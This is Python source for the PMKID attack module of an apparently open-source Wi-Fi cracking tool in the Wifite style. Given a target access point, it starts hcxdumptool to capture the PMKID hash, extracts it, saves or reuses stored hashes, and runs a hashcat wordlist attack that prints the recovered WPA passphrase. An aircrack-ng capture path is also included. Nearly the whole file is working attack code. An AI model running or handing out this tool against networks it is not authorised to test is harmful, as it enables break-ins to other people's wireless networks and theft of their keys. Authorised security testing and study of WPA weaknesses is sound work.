#!/usr/bin/env python
# -*- coding: utf-8 -*-

from ..model.attack import Attack
from ..config import Configuration
from ..tools.hashcat import HcxDumpTool, HcxPcapngTool, Hashcat
from ..util.color import Color
from ..util.timer import Timer
from ..model.pmkid_result import CrackResultPMKID
from ..tools.airodump import Airodump
from threading import Thread, active_count
import os
import time
import re
import glob
from shutil import copy


class AttackPMKID(Attack):
    def __init__(self, target):
        super(AttackPMKID, self).__init__(target)
        self.crack_result = None
        self.do_airCRACK = False
        self.keep_capturing = None
        self.pcapng_file = Configuration.temp('pmkid.pcapng')
        self.success = False
        self.timer = None

    @staticmethod
    def get_existing_pmkid_file(bssid):
        """
        Returns existing PMKID hash file for the given BSSID.
        Returns None if no PMKID hash file exists for the given BSSID.
        """
        if not os.path.exists(Configuration.wpa_handshake_dir):
            return None

        bssid = bssid.lower().replace(':', '')

        if Configuration.verbose > 1:
            Color.pl('{+} {D}Looking for existing PMKID for BSSID: {C}%s{W}' % bssid)

        # Use glob pattern for better file matching
        pmkid_pattern = os.path.join(Configuration.wpa_handshake_dir, 'pmkid_*.22000')
        for pmkid_filename in glob.glob(pmkid_pattern):
            if not os.path.isfile(pmkid_filename):
                continue

            try:
                with open(pmkid_filename, 'r') as pmkid_handle:
                    pmkid_hash = pmkid_handle.read().strip()

                    if Configuration.verbose > 2:
                        Color.pl('{+} {D}Checking file {C}%s{W}: {C}%s{W}' % (os.path.basename(pmkid_filename), pmkid_hash[:50] + '...'))

                    # Validate hash format before parsing
                    if not pmkid_hash or not pmkid_hash.startswith('WPA*'):
                        if Configuration.verbose > 2:
                            Color.pl('{+} {D}SKIP: Invalid hash format in {C}%s{W}' % os.path.basename(pmkid_filename))
                        continue

                    # Split hash and validate sufficient fields
                    hash_fields = pmkid_hash.split('*')
                    if len(hash_fields) < 4:
                        if Configuration.verbose > 2:
                            Color.pl('{+} {D}SKIP: Insufficient fields in {C}%s{W} (got %d, need 4+)' % (os.path.basename(pmkid_filename), len(hash_fields)))
                        continue

                    # Extract BSSID from correct field (index 3, not 1)
                    existing_bssid = hash_fields[3].lower().replace(':', '')

                    # Validate extracted BSSID format
                    if len(existing_bssid) != 12 or not all(c in '0123456789abcdef' for c in existing_bssid):
                        if Configuration.verbose > 2:
                            Color.pl('{+} {D}SKIP: Invalid BSSID format in {C}%s{W}: {C}%s{W}' % (os.path.basename(pmkid_filename), existing_bssid))
                        continue

                    if Configuration.verbose > 2:
                        Color.pl('{+} {D}Extracted BSSID: {C}%s{W} vs target: {C}%s{W}' % (existing_bssid, bssid))

                    if existing_bssid == bssid:
                        if Configuration.verbose > 1:
                            Color.pl('{+} {G}Found matching PMKID file: {C}%s{W}' % os.path.basename(pmkid_filename))
                        return pmkid_filename

            except (IOError, OSError) as e:
                if Configuration.verbose > 2:
                    Color.pl('{+} {R}ERROR reading {C}%s{W}: %s' % (os.path.basename(pmkid_filename), str(e)))
                continue

        if Configuration.verbose > 1:
            Color.pl('{+} {D}No existing PMKID found for BSSID: {C}%s{W}' % bssid)
        return None

    def run_hashcat(self):
        """
        Performs PMKID attack, if possible.
            1) Captures PMKID hash (or re-uses existing hash if found).
            2) Cracks the hash.

        Returns:
            True if handshake is captured. False otherwise.
        """

        # Skip if user doesn't want to run PMKID attack
        if Configuration.dont_use_pmkid:
            self.success = False
            return False

        from ..util.process import Process
        # Check that we have all hashcat programs
        dependencies = [
            HcxDumpTool.dependency_name,
            HcxPcapngTool.dependency_name
        ]
        if missing_deps := [dep for dep in dependencies if not Process.exists(dep)]:
            Color.pl('{!} Skipping PMKID attack, missing required tools: {O}%s{W}' % ', '.join(missing_deps))
            return False

        pmkid_file = None

        if not Configuration.ignore_old_handshakes:
            # Load existing PMKID hash from filesystem
            if Configuration.verbose > 1:
                Color.pl('{+} {D}Checking for existing PMKID for BSSID: {C}%s{W}' % self.target.bssid)
            pmkid_file = AttackPMKID.get_existing_pmkid_file(self.target.bssid)
            if pmkid_file is not None:
                Color.pattack('PMKID', self.target, 'CAPTURE',
                              'Using {C}existing{W} PMKID hash: {C}%s{W}' % os.path.basename(pmkid_file))
            elif Configuration.verbose > 1:
                Color.pl('{+} {D}No existing PMKID found, will capture new one{W}')

        if pmkid_file is None:
            # Capture hash from live target.
            pmkid_file = self.capture_pmkid()

        if pmkid_file is None:
            return False  # No hash found.

        # Check for the --skip-crack flag
        if Configuration.skip_crack:
            return self._extracted_from_run_hashcat_44(
                '{+} Not cracking pmkid because {C}skip-crack{W} was used{W}'
            )
        # Crack it.
        if Process.exists(Hashcat.dependency_name):
            try:
                self.success = self.crack_pmkid_file(pmkid_file)
            except KeyboardInterrupt:
                return self._extracted_from_run_hashcat_44(
                    '\n{!} {R}Failed to crack PMKID: {O}Cracking interrupted by user{W}'
                )
        else:
            self.success = False
            Color.pl('\n {O}[{R}!{O}] Note: PMKID attacks are not possible because you do not have {C}%s{O}.{W}'
                     % Hashcat.dependency_name)

        return True  # Even if we don't crack it, capturing a PMKID is 'successful'

    # TODO Rename this here and in `run_hashcat`
    def _extracted_from_run_hashcat_44(self, arg0):
        Color.pl(arg0)
        self.success = False
        return True

    def run(self):
        if self.do_airCRACK:
            self.run_aircrack()
        else:
            self.run_hashcat()

    def run_aircrack(self):
        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='wpa') as airodump:

            Color.clear_entire_line()
            Color.pattack('WPA', self.target, 'PMKID capture', 'Waiting for target to appear...')
            try:
                airodump_target = self.wait_for_target(airodump)
            except Exception as e:
                Color.pl('\n{!} {R}Target timeout:{W} %s' % str(e))
                return None

            # # Try to load existing handshake
            # if Configuration.ignore_old_handshakes == False:
            #     bssid = airodump_target.bssid
            #     essid = airodump_target.essid if airodump_target.essid_known else None
            #     handshake = self.load_handshake(bssid=bssid, essid=essid)
            #     if handshake:
            #         Color.pattack('WPA', self.target, 'Handshake capture',
            #                       'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
            #         Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
            #         return handshake

            timeout_timer = Timer(Configuration.wpa_attack_timeout)

            while not timeout_timer.ended():
                step_timer = Timer(1)
                Color.clear_entire_line()
                Color.pattack('WPA',
                              airodump_target,
                              'Handshake capture',
                              'Listening. (clients:{G}{W}, deauth:{O}{W}, timeout:{R}%s{W})' % timeout_timer)

                # Find .cap file
                cap_files = airodump.find_files(endswith='.cap')
                if len(cap_files) == 0:
                    # No cap files yet
                    time.sleep(step_timer.remaining())
                    continue
                cap_file = cap_files[0]

                # Copy .cap file to temp for consistency
                temp_file = Configuration.temp('handshake.cap.bak')
                copy(cap_file, temp_file)

                # Check cap file in temp for Handshake
                # bssid = airodump_target.bssid
                # essid = airodump_target.essid if airodump_target.essid_known else None

                # AttackPMKID.check_pmkid(temp_file, self.target.bssid)
                if self.check_pmkid(temp_file):
                    # We got a handshake
                    Color.clear_entire_line()
                    Color.pattack('WPA', airodump_target, 'PMKID capture', '{G}Captured PMKID{W}')
                    Color.pl('')
                    capture = temp_file
                    break

                # There is no handshake
                capture = None
                # Delete copied .cap file in temp to save space
                os.remove(temp_file)

                # # Look for new clients
                # airodump_target = self.wait_for_target(airodump)
                # for client in airodump_target.clients:
                #     if client.station not in self.clients:
                #         Color.clear_entire_line()
                #         Color.pattack('WPA',
                #                 airodump_target,
                #                 'Handshake capture',
                #                 'Discovered new client: {G}%s{W}' % client.station)
                #         Color.pl('')
                #         self.clients.append(client.station)

                # # Send deauth to a client or broadcast
                # if deauth_timer.ended():
                #     self.deauth(airodump_target)
                #     # Restart timer
                #     deauth_timer = Timer(Configuration.wpa_deauth_timeout)

                # # Sleep for at-most 1 second
                time.sleep(step_timer.remaining())
                # continue # Handshake listen+deauth loop

        if capture is None:
            # No handshake, attack failed.
            Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
                Configuration.wpa_attack_timeout))
            self.success = False
        else:
            # Save copy of handshake to ./hs/
            self.success = False
            self.save_pmkid(capture)

        return self.success

    def check_pmkid(self, filename):
        """Returns tuple (BSSID,None) if aircrack thinks self.capfile contains a handshake / can be cracked"""

        from ..util.process import Process

        command = f'aircrack-ng  "{filename}"'
        (stdout, stderr) = Process.call(command)

        return any('with PMKID' in line and self.target.bssid in line for line in stdout.split("\n"))

    def capture_pmkid(self):
        """
        Runs hashcat's hcxpcapngtool to extract PMKID hash from the .pcapng file.
        Returns:
            The PMKID hash (str) if found, otherwise None.
        """
        self.keep_capturing = True
        self.timer = Timer(Configuration.pmkid_timeout)

        # Check file descriptor usage and thread count before starting
        from ..util.process import Process
        if Process.check_fd_limit() or active_count() > 20:  # Limit concurrent threads
            Color.pl('{!} {O}Delaying PMKID attack due to high resource usage{W}')
            time.sleep(2)  # Brief delay to allow cleanup

        # Start hcxdumptool
        t = Thread(target=self.dumptool_thread)
        t.start()

        # Repeatedly run pcaptool & check output for hash for self.target.essid
        pmkid_hash = None
        pcaptool = HcxPcapngTool(self.target)
        while self.timer.remaining() > 0:
            pmkid_hash = pcaptool.get_pmkid_hash(self.pcapng_file)
            if pmkid_hash is not None:
                break  # Got PMKID

            Color.pattack('PMKID', self.target, 'CAPTURE', 'Waiting for PMKID ({C}%s{W})' % str(self.timer))
            time.sleep(1)

        self.keep_capturing = False

        if pmkid_hash is None:
            Color.pattack('PMKID', self.target, 'CAPTURE', '{R}Failed{O} to capture PMKID\n')
            Color.pl('')
            return None  # No hash found.

        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CAPTURE', '{G}Captured PMKID{W}')
        return self.save_pmkid(pmkid_hash)

    def crack_pmkid_file(self, pmkid_file):
        """
        Runs hashcat containing PMKID hash (*.22000).
        If cracked, saves results in self.crack_result
        Returns:
            True if cracked, False otherwise.
        """

        # Check that wordlist exists before cracking.
        if Configuration.wordlist is None:
            Color.pl('\n{!} {O}Not cracking PMKID because there is no {R}wordlist{O} (re-run with {C}--dict{O})')

            Color.pl('{!} {O}Run Wifite with the {R}--crack{O} and {R}--dict{O} options to try again.')

            key = None
        else:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, 'CRACK', 'Cracking PMKID using {C}%s{W} ...\n' % Configuration.wordlist)
            key = Hashcat.crack_pmkid(pmkid_file)

        if key is not None:
            return self._extracted_from_crack_pmkid_file_31(key, pmkid_file)
        # Failed to crack.
        if Configuration.wordlist is not None:
            Color.clear_entire_line()
            Color.pattack('PMKID', self.target, '{R}CRACK',
                          '{R}Failed {O}Passphrase not found in dictionary.\n')
        return False

    # TODO Rename this here and in `crack_pmkid_file`
    def _extracted_from_crack_pmkid_file_31(self, key, pmkid_file):
        # Successfully cracked.
        Color.clear_entire_line()
        Color.pattack('PMKID', self.target, 'CRACKED', '{C}Key: {G}%s{W}' % key)
        self.crack_result = CrackResultPMKID(self.target.bssid, self.target.essid,
                                             pmkid_file, key)
        Color.pl('\n')
        self.crack_result.dump()
        return True

    def dumptool_thread(self):
        """Runs hashcat's hcxdumptool until it dies or `keep_capturing == False`"""
        try:
            with HcxDumpTool(self.target, self.pcapng_file) as dumptool:
                # Let the dump tool run until we have the hash.
                while self.keep_capturing and dumptool.poll() is None:
                    time.sleep(0.5)
        except Exception as e:
            if Configuration.verbose > 0:
                Color.pl(f'\n{{!}} {{R}}HcxDumpTool error{{W}}: {str(e)}')
        # Context manager will handle cleanup automatically

    def save_pmkid(self, pmkid_hash):
        """Saves a copy of the pmkid (handshake) to hs/ directory."""
        # Create handshake dir
        if self.do_airCRACK:
            return self._extracted_from_save_pmkid_6(pmkid_hash)
        if not os.path.exists(Configuration.wpa_handshake_dir):
            os.makedirs(Configuration.wpa_handshake_dir)

        pmkid_file = self._extracted_from_save_pmkid_21('.22000')
        with open(pmkid_file, 'w') as pmkid_handle:
            pmkid_handle.write(pmkid_hash)
            pmkid_handle.write('\n')

        return pmkid_file

    # TODO Rename this here and in `save_pmkid`
    def _extracted_from_save_pmkid_21(self, arg0):
        # Generate filesystem-safe filename from bssid, essid and date
        essid_safe = re.sub('[^a-zA-Z0-9]', '', self.target.essid)
        bssid_safe = self.target.bssid.replace(':', '-')
        date = time.strftime('%Y-%m-%dT%H-%M-%S')
        result = f'pmkid_{essid_safe}_{bssid_safe}_{date}{arg0}'
        result = os.path.join(Configuration.wpa_handshake_dir, result)

        Color.p('\n{+} Saving copy of {C}PMKID Hash{W} to {C}%s{W} ' % result)
        return result

    # TODO Rename this here and in `save_pmkid`
    def _extracted_from_save_pmkid_6(self, pmkid_hash):
        pmkid_file = self._extracted_from_save_pmkid_21('.cap')
        copy(pmkid_hash, pmkid_file)
        return pmkid_file
